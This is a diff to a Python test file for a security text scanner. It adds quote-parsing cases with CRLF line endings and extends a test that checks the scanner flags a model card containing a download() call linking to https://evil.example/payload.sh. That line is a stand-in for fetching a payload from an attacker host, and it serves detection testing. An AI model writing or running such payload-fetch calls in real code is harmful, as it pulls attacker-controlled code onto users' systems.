@@ -2596,6 +2596,8 @@ def test_text_scanner_long_html_whitespace_without_open_assignment_is_informatio
         (b"a='closed' [link]", b"[link]", False),
         (b"a=';b=''[link]", b"[link]", True),
         (b'a="line\\\n[link]', b"[link]", True),
+        (b'a="line\\\r\n[link]', b"[link]", True),
+        (b'a="line\r\n[link]', b"[link]", False),
         (b'a="line\n[link]', b"[link]", False),
         (b"a=`escaped\\`[link]", b"[link]", True),
         (b"a=`closed` [link]", b"[link]", False),
@@ -2641,12 +2643,14 @@ def test_text_scanner_model_card_wrapped_call_markdown_link_remains_actionable(t
     )
 
 
+@pytest.mark.parametrize("indent", ["", "    "])
+@pytest.mark.parametrize("prefix", ["", "prefix ) "])
 @pytest.mark.parametrize("tag", ["", "String.raw"])
 def test_text_scanner_model_card_wrapped_template_literal_markdown_link_remains_actionable(
-    tmp_path: Path, tag: str
+    tmp_path: Path, tag: str, prefix: str, indent: str
 ) -> None:
     _assert_model_card_payload_endpoint_actionable(
-        tmp_path, f"download(\n    {tag}`[download](https://evil.example/payload.sh)`\n)\n"
+        tmp_path, f"{indent}download(\n    {tag}`{prefix}[download](https://evil.example/payload.sh)`\n{indent})\n"
     )
 
 
